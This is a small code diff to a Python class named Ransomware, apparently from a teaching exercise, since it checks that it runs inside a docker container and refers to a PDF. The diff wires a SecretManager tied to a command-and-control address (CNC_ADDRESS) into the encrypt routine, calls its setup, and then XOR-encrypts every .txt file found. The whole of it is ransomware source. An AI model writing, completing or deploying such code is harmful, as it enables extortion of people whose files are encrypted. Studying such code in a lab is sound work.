@@ -30,7 +30,6 @@ class Ransomware:
     def __init__(self) -> None:
         self.check_hostname_is_docker()
         self._log = logging.getLogger(self.__class__.__name__)
-        self._secret_manager = SecretManager(remote_host_port=CNC_ADDRESS, path=TOKEN_PATH)
 
     def check_hostname_is_docker(self) -> None:
         # At first, we check if we are in a docker
@@ -58,7 +57,9 @@ class Ransomware:
 
     def encrypt(self) -> None:
         # main function for encrypting (see PDF)
-        # self._log.info(self.get_files("*.txt"))
+        self._log.info(self.get_files("*.txt"))
+        self._secret_manager = SecretManager(remote_host_port=CNC_ADDRESS, path=TOKEN_PATH)
+        self._secret_manager.setup()
         self._secret_manager.xorfiles(self.get_files("*.txt"))
         return None
         
